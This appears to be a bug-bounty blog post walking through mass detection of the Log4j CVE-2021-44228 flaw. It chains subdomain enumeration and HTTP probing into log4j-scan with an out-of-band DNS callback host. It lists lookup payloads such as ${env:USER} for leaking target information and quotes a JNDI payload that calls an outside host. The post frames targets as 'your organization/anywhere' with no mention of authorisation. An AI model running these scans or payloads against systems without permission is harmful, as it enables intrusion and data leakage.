---
title: "Finding Log4j (The skiddie way)"
date: 2021-12-18T17:17:04+05:30
draft: true
tags:
  - bugbounty
  - shorts
  - log4j
---


## About
So the past week the internet was on fire, log4j CVE dropped and it dropped hard. It was like as if people were running for their lives, 
putting out fires. And it got even worse after the infosec community quickly started hunting for this vulnerability. 
Today let’s take a dig into vulnerability  and learn how to find it (The skiddie way).

## What is Log4j CVE-2021-44228
I guess you already know about it, if not then here are some great resources:
* [NIST](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* [Lunasec article](https://www.lunasec.io/docs/blog/log4j-zero-day/)
* [John Hammond's video explaintaion](https://www.youtube.com/watch?v=7qoPDq41xhQ)

## How to quickly find it in your organization/anywhere
We will need a few tools for this,
* [subfinder](https://github.com/projectdiscovery/subfinder)
* [assetfinder](https://github.com/tomnomnom/assetfinder)
* [httpx](https://github.com/projectdiscovery/httpx)
* [log4j-scan](https://github.com/fullhunt/log4j-scan)
* Burp Collaborator or any custom callback dns host (ex: dnslog.cn)

First we need to find all subdomains for a particular scope, let's say "example.com", here's a quick one-liner to do that

```shell
{ subfinder -silent -d <domain> ; assetfinder -subs-only <domain> } | sort -u | tee subs.txt
```



This will create a subs.txt file containing subdomains for the given domain (crowdsourced).

![Subdomains](/images/find-log4j/1.png)



Now we have to probe these subdomains to find which of them have a web application hosted 

```shell
cat subs.txt | httpx -silent -title -status-code -ports 80,443,5000,8080,8000 | awk '{print $1}' | tee endpoints.txt
```

The above one-liner will get us the URLs for all the hosted web applications, now all we have to do it pass it to the log4j-scan tool and it will
do all the magic by itself.


```shell
python3 log4j-scan.py -l endpoints.txt --custom-dns-callback-host <Burp collab url> --run-all-tests
```

After running this, if we get a dns callback on our burp collaborator (or other dns service that you are using), then it proves the particular web application might be vulnerable to log4j CVE-2021-44228.

It should look something like this:

![DNS callback](/images/find-log4j/2.png)

You can use the following payloads to fetch more information usign this vuln:

* ${hostName}
* ${whoami}
* ${java:os}
* ${env:USER}


## What does this Log4j-Scan tool do ?

Well to this tool inserts the most used jndi payloads (ex: {jndi:ldap://mydogsbutt.com/a}) in multiple headers and params of the request. If the web application uses log4j to log any of these parameters or headers, then it might trigger the payload. An example of request sent by log4j-scan is shown below

![Burp Proxy](/images/find-log4j/3.png)


## Conclusion
So this was a quick walkthrough of the skiddie way to find log4j vuln. If you're lucky and score a bounty, feel free to [buy me a beer](https://buymeacoffee.com/ev1lm0rty) ;)
